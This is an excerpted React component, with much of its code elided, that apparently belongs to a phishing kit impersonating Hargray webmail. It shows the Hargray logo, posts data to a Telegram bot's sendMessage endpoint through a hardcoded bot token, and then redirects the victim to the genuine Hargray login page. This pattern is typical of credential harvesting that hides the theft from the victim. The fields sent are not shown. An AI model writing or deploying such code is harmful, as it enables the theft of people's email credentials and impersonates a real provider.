...
import hargray from './hargray.png';
...
function Home(){
    ...
    const[platform, setPlatform] = useState("Hargray")
    ...
    try {
       ...
       const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
        ...
        if(response.status == 200){
           ...
           window.location.href = 'https://webmail.hargray.com/#/login';
        }
      } catch (error) {
        // Handle error
    ...
    return (
        <>
            <nav className='mynav px-3 py-1 bg-dark'>
                <img className='navimage' src={hargray} />
